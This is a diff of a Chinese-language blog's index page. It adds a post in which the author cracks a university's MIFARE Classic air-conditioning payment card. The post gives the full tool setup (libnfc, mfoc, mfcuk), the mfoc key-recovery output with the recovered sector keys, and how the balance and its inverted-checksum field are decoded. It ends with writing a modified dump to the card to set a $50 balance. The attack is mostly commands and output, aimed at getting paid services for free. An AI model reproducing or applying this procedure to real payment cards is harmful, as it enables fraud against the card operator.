@@ -263,6 +263,184 @@
             
               
                 
+                <a class="post-title-link" href="/2016/08/31/ntu-aircon/" itemprop="url">
+                  破解NTU RFID空调收费卡
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-08-31T00:34:22+08:00" content="2016-08-31">
+              2016-08-31
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/rfid/" itemprop="url" rel="index">
+                    <span itemprop="name">rfid</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/08/31/ntu-aircon/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/08/31/ntu-aircon/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>自从住进了学校空调都不怎么敢开，因为太贵了！早就听说了有大四学长要加$10充值$50的金额，仔细想了一下之后觉得背后原理应该挺简单的。还是自己来吧，乐趣多多。</p>
+<p>稍微google了一下之后，下单买了一个NFC读卡器。刚好上周回国顺便拿了。</p>
+<p>中间省略了很多给小米笔记本装系统的过程，再开一篇另外说（简直坑</p>
+<p>因为手头没有Android并且带NFC的手机也没有办法查看卡是不是属于MIFARE系列的，只有阅读维基百科的描述。</p>
+<p>根据维基百科描述，我有很大把我确定是Mifare Classic的卡片。</p>
+<p>关于Mifare Classic的卡片资料，网上太多了，这里就不在重新说明了。最后会附上一些链接。</p>
+<p><img src="http://i.imgur.com/l9rpXF8.jpg" alt=""></p>
+<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>经过各种折腾最后选了xfce的mint，其实就是ubuntu，反正我觉得没有什么区别。</p>
+<p>安装各种依赖组件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install autoconf automake libtool libusb-dev git</div></pre></td></tr></table></figure>
+<p>安装读卡器驱动程序</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install libpcsclite-dev</div></pre></td></tr></table></figure>
+<p>安装libnfc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install libnfc-dev libnfc-bin</div></pre></td></tr></table></figure>
+<p>安装mfoc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/nfc-tools/mfoc</div><div class="line">cd mfoc</div><div class="line">autoreconf -vis</div><div class="line">automake</div><div class="line">autoconf</div><div class="line">./configure</div><div class="line">make</div><div class="line">sudo make install</div></pre></td></tr></table></figure>
+<p>安装mfcuk</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/nfc-tools/mfcuk</div><div class="line">cd mfcuk</div><div class="line">autoreconf</div><div class="line">automake</div><div class="line">autoconf</div><div class="line">./configure</div><div class="line">make</div><div class="line">sudo make install</div></pre></td></tr></table></figure>
+<p>安装hexedit</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install hexedit</div></pre></td></tr></table></figure>
+<h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p>到此为止，读卡器应该顺利接上，并且可以读取RFID卡的内容了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nfc-list</div></pre></td></tr></table></figure>
+<p><img src="http://i.imgur.com/AMZTrby.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nfc-list</div></pre></td></tr></table></figure>
+<p><img src="http://i.imgur.com/0R3pm9Q.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mfoc -O org.dump</div></pre></td></tr></table></figure>
+<p><img src="http://i.imgur.com/pcDP4nP.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div></pre></td><td class="code"><pre><div class="line">ISO/IEC 14443A (106 kbps) target:</div><div class="line">    ATQA (SENS_RES): 00  04  </div><div class="line">* UID size: single</div><div class="line">* bit frame anticollision supported</div><div class="line">       UID (NFCID1): 47  d8  58  ef  </div><div class="line">      SAK (SEL_RES): 08  </div><div class="line">* Not compliant with ISO/IEC 14443-4</div><div class="line">* Not compliant with ISO/IEC 18092</div><div class="line"></div><div class="line">Fingerprinting based on MIFARE type Identification Procedure:</div><div class="line">* MIFARE Classic 1K</div><div class="line">* MIFARE Plus (4 Byte UID or 4 Byte RID) 2K, Security level 1</div><div class="line">* SmartMX with MIFARE 1K emulation</div><div class="line">Other possible matches based on ATQA &amp; SAK values:</div><div class="line"></div><div class="line">Try to authenticate to all sectors with default keys...</div><div class="line">Symbols: &apos;.&apos; no key found, &apos;/&apos; A key found, &apos;\&apos; B key found, &apos;x&apos; both keys found</div><div class="line">[Key: ffffffffffff] -&gt; [...xxxxxxxxxxxxx]</div><div class="line">[Key: a0a1a2a3a4a5] -&gt; [...xxxxxxxxxxxxx]</div><div class="line">[Key: d3f7d3f7d3f7] -&gt; [...xxxxxxxxxxxxx]</div><div class="line">[Key: 000000000000] -&gt; [...xxxxxxxxxxxxx]</div><div class="line">[Key: b0b1b2b3b4b5] -&gt; [...xxxxxxxxxxxxx]</div><div class="line">[Key: 4d3a99c351dd] -&gt; [...xxxxxxxxxxxxx]</div><div class="line">[Key: 1a982c7e459a] -&gt; [...xxxxxxxxxxxxx]</div><div class="line">[Key: aabbccddeeff] -&gt; [...xxxxxxxxxxxxx]</div><div class="line">[Key: 714c5c886e97] -&gt; [...xxxxxxxxxxxxx]</div><div class="line">[Key: 587ee5f9350f] -&gt; [...xxxxxxxxxxxxx]</div><div class="line">[Key: a0478cc39091] -&gt; [...xxxxxxxxxxxxx]</div><div class="line">[Key: 533cb6c723f6] -&gt; [...xxxxxxxxxxxxx]</div><div class="line">[Key: 8fd0a4f256e9] -&gt; [...xxxxxxxxxxxxx]</div><div class="line"></div><div class="line">Sector 00 -  UNKNOWN_KEY [A]  Sector 00 -  UNKNOWN_KEY [B]  </div><div class="line">Sector 01 -  UNKNOWN_KEY [A]  Sector 01 -  UNKNOWN_KEY [B]  </div><div class="line">Sector 02 -  UNKNOWN_KEY [A]  Sector 02 -  UNKNOWN_KEY [B]  </div><div class="line">Sector 03 -  FOUND_KEY   [A]  Sector 03 -  FOUND_KEY   [B]  </div><div class="line">Sector 04 -  FOUND_KEY   [A]  Sector 04 -  FOUND_KEY   [B]  </div><div class="line">Sector 05 -  FOUND_KEY   [A]  Sector 05 -  FOUND_KEY   [B]  </div><div class="line">Sector 06 -  FOUND_KEY   [A]  Sector 06 -  FOUND_KEY   [B]  </div><div class="line">Sector 07 -  FOUND_KEY   [A]  Sector 07 -  FOUND_KEY   [B]  </div><div class="line">Sector 08 -  FOUND_KEY   [A]  Sector 08 -  FOUND_KEY   [B]  </div><div class="line">Sector 09 -  FOUND_KEY   [A]  Sector 09 -  FOUND_KEY   [B]  </div><div class="line">Sector 10 -  FOUND_KEY   [A]  Sector 10 -  FOUND_KEY   [B]  </div><div class="line">Sector 11 -  FOUND_KEY   [A]  Sector 11 -  FOUND_KEY   [B]  </div><div class="line">Sector 12 -  FOUND_KEY   [A]  Sector 12 -  FOUND_KEY   [B]  </div><div class="line">Sector 13 -  FOUND_KEY   [A]  Sector 13 -  FOUND_KEY   [B]  </div><div class="line">Sector 14 -  FOUND_KEY   [A]  Sector 14 -  FOUND_KEY   [B]  </div><div class="line">Sector 15 -  FOUND_KEY   [A]  Sector 15 -  FOUND_KEY   [B]  </div><div class="line"></div><div class="line"></div><div class="line">Using sector 03 as an exploit sector</div><div class="line">Sector: 0, type A, probe 0, distance 9023 .....</div><div class="line">Sector: 0, type A, probe 1, distance 9007 .....</div><div class="line">Sector: 0, type A, probe 2, distance 8989 .....</div><div class="line">Sector: 0, type A, probe 3, distance 9007 .....</div><div class="line">Found Key: A [4d6174f2ca40]</div><div class="line">Sector: 1, type A</div><div class="line">Found Key: A [4d6174f2ca40]</div><div class="line">Sector: 2, type A</div><div class="line">Found Key: A [4d6174f2ca40]</div><div class="line">Sector: 0, type B, probe 0, distance 8991 .....</div><div class="line">Found Key: B [7df6b7b73ef8]</div><div class="line">Sector: 1, type B</div><div class="line">Found Key: B [7df6b7b73ef8]</div><div class="line">Sector: 2, type B</div><div class="line">Found Key: B [7df6b7b73ef8]</div><div class="line">Auth with all sectors succeeded, dumping keys to a file!</div><div class="line">Block 63, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  </div><div class="line">Block 62, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 61, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 60, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 59, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  </div><div class="line">Block 58, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 57, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 56, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 55, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  </div><div class="line">Block 54, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 53, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 52, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 51, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  </div><div class="line">Block 50, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 49, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 48, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 47, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  </div><div class="line">Block 46, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 45, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 44, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 43, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  </div><div class="line">Block 42, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 41, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 40, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 39, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  </div><div class="line">Block 38, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 37, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 36, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 35, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  </div><div class="line">Block 34, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 33, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 32, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 31, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  </div><div class="line">Block 30, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 29, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 28, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 27, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  </div><div class="line">Block 26, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 25, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 24, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 23, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  </div><div class="line">Block 22, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 21, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 20, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 19, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  </div><div class="line">Block 18, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 17, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 16, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 15, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  </div><div class="line">Block 14, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 13, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 12, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 11, type A, key 4d6174f2ca40 :00  00  00  00  00  00  08  77  8f  69  00  00  00  00  00  00  </div><div class="line">Block 10, type A, key 4d6174f2ca40 :20  4e  00  00  df  b1  ff  ff  20  4e  00  00  00  ff  00  ff  </div><div class="line">Block 09, type A, key 4d6174f2ca40 :56  0e  00  00  a9  f1  ff  ff  56  0e  00  00  09  f6  09  f6  </div><div class="line">Block 08, type A, key 4d6174f2ca40 :00  00  00  00  00  00  00  00  30  30  30  33  33  30  34  32  </div><div class="line">Block 07, type A, key 4d6174f2ca40 :00  00  00  00  00  00  38  77  8c  00  00  00  00  00  00  00  </div><div class="line">Block 06, type A, key 4d6174f2ca40 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 05, type A, key 4d6174f2ca40 :00  00  00  00  00  00  00  00  00  00  02  5f  18  d2  ff  00  </div><div class="line">Block 04, type A, key 4d6174f2ca40 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 03, type A, key 4d6174f2ca40 :00  00  00  00  00  00  78  77  88  00  00  00  00  00  00  00  </div><div class="line">Block 02, type A, key 4d6174f2ca40 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 01, type A, key 4d6174f2ca40 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 00, type A, key 4d6174f2ca40 :47  d8  58  ef  28  08  04  00  62  63  64  65  66  67  68  69</div></pre></td></tr></table></figure>
+<p>可以看到其中前三个区块是加密的，后面所有区块都是使用的默认密码。</p>
+<p>并且剩下的密码也被nested authentication攻击破解了。</p>
+<p>之后的事情就是使用空调卡，然后导出三组不同的数据进行分析。</p>
+<p>看了网上很多都是用winhex在win平台下进行的，我对这些内容还不是很熟悉。于是我选择了其他方法。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">xxd org.dump &gt; org.hex</div><div class="line">xxd used.dump &gt; used.hex</div><div class="line">diff org.hex used.hex</div><div class="line"></div><div class="line">10c10</div><div class="line">&lt; 00000090: 380e 0000 c7f1 ffff 380e 0000 09f6 09f6  8.......8.......</div><div class="line">---</div><div class="line">&gt; 00000090: 4c0e 0000 b3f1 ffff 4c0e 0000 09f6 09f6  L.......L.......</div></pre></td></tr></table></figure>
+<p>可以看到每次金额的变化都反应在了这个地方。</p>
+<p>直接把0x380e和0x4c0e变成10进制，得到的内容完全没有任何意义。接着尝试c7f1和b3f1还是没有任何意义。</p>
+<p>然后把380e反过来，0e38变成10进制变成了3640刚好对应卡上$3.64的金额，0e4c对应$3.66的金额。</p>
+<p>不用想也知道c7f1和b3f1也要反过来了，然而反过来之后转换十进制还是没有任何意义。</p>
+<p>想到谋篇文章看到说是验证，通过二进制取反得到的。</p>
+<p>试了一下 <code>c7f1 --&gt; f1c7 --&gt; 1111000111000111 --&gt; 0000111000111000 --&gt; 0xe38</code></p>
+<p>刚好对上了！</p>
+<p>接下来就是修改一个dump文件测试了</p>
+<p><img src="http://i.imgur.com/G6q6VGE.png" alt=""></p>
+<p>直接修改成$50。</p>
+<h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><p>最后就是把数据写入卡中了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nfc-mfclassic W b 50.dump used.dump</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">NFC reader: ACS / ACR122U PICC Interface opened Found MIFARE Classic card: ISO/IEC 14443A (106 kbps) target: ATQA (SENS_RES): 00 04  UID (NFCID1): 3e 0c 5a fa  SAK (SEL_RES): 08  Guessing size: seems to be a 1024-byte card Writing 64 blocks |...............................................................| Done, 63 of 64 blocks written.</div></pre></td></tr></table></figure>
+<p>卡入卡槽，$50实现了。</p>
+<p><img src="http://i.imgur.com/6Km9VGt.jpg" alt=""></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.george-smart.co.uk/wiki/NFC_Experiments" target="_blank" rel="external">NFC Experiments</a></p>
+<p><a href="http://www.nicolascourtois.com/MifareClassicHack.pdf" target="_blank" rel="external">HACKING MIFARE CLASSIC</a></p>
+<p><a href="https://en.wikipedia.org/wiki/MIFARE" target="_blank" rel="external">MIFARE</a></p>
+<p><a href="https://firefart.at/post/how-to-crack-mifare-classic-cards/" target="_blank" rel="external">How to Crack Mifare Classic Cards</a></p>
+<p><a href="http://www.freebuf.com/articles/wireless/8792.html" target="_blank" rel="external">RFID破解三两事</a></p>
+<p><a href="http://www.backtrack-linux.org/wiki/index.php/RFID_Cooking_with_Mifare_Classic" target="_blank" rel="external">RFID Cooking with Mifare Classic</a></p>
+<p><a href="http://l-an5.lofter.com/post/1d1706f2_63363bc" target="_blank" rel="external">校园水卡破解笔记</a></p>
+<p><a href="https://www.91ri.org/14148.html" target="_blank" rel="external">RFID入门</a></p>
+<p><a href="https://bobylive.com/static/1493" target="_blank" rel="external">https://bobylive.com/static/1493</a></p>
+<p><a href="http://www.evil0x.com/posts/5619.html" target="_blank" rel="external">Mifare1卡破解分析</a></p>
+<p><a href="https://zozs.se/2014/08/18/acr122u-mfcuk-mfoc-cracking-mifare-classic-on-arch-linux/" target="_blank" rel="external">ACR122U, mfcuk, and mfoc: Cracking MIFARE Classic on Arch Linux</a></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
                 <a class="post-title-link" href="/2016/08/24/access-roaming-profile/" itemprop="url">
                   获取用户漫游配置文件权限
                 </a>
@@ -728,136 +906,6 @@
 
 
     
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/08/06/track-remove/" itemprop="url">
-                  监控删除文件记录
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-08-06T13:51:46+08:00" content="2016-08-06">
-              2016-08-06
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/服务器/" itemprop="url" rel="index">
-                    <span itemprop="name">服务器</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/08/06/track-remove/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/08/06/track-remove/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>服务器做好之前，就有某员工提出如果文件被删除了怎么办？</p>
-<p>我当时觉得权限分配的很谨慎了，难道一个部门内的人还会删除自己部门的文件还自己么？</p>
-<p>事实证明</p>
-<blockquote>
-<p>to young, to native!</p>
-</blockquote>
-<p>才一个星期吧，就有人反应说部门文件被人删除了。那监管系统就刻不容缓的需要上线了。</p>
-<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>我一直觉得要对每个文件的修改做出记录是一件很麻烦的事情，并且我也想利用windows自带的功能实现。网上转了一圈之后发现windows的审核可以达到相应的效果。</p>
-<p>和经理沟通了一下，觉得没有必要记录所有的操作，只要能追踪到删除记录就可以了。</p>
-          <div class="post-more-link text-center">
-            <a class="btn" href="/2016/08/06/track-remove/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -903,7 +951,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">21</span>
+              <span class="site-state-item-count">22</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -911,7 +959,7 @@
           
             <div class="site-state-item site-state-categories">
               <a href="/categories">
-                <span class="site-state-item-count">9</span>
+                <span class="site-state-item-count">10</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -920,7 +968,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">41</span>
+                <span class="site-state-item-count">44</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
